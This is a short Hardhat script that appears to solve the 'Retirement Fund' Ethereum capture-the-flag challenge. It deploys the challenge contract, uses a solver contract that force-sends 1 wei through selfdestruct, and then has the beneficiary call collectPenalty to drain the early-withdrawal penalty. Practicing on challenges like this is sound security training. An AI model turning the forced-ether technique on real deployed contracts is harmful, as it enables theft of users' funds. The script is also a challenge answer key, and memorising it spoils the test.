import { ethers } from "hardhat";

async function main() {
  const amount = ethers.parseEther("1");
  const smallAmount = ethers.parseUnits("1", "wei");

  // get beneficiary signers
  const accounts = await ethers.getSigners();
  const beneficiary = accounts[1];

  // deploy retirement contract
  const factory = await ethers.getContractFactory("RetirementFundChallenge");
  const contract = await factory.deploy(beneficiary.address, {
    value: amount,
  });
  await contract.waitForDeployment();

  // deploy selfdestruct contract
  const destroyFactory = await ethers.getContractFactory(
    "RetirementFundSolver"
  );
  const destroyContract = await destroyFactory.deploy(contract.target, {
    value: smallAmount,
  });
  await destroyContract.waitForDeployment();

  // collect penalty
  const collect = await contract.connect(beneficiary).collectPenalty();
  await collect.wait();

  const isComplete = await contract.isComplete();
  console.log(isComplete);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
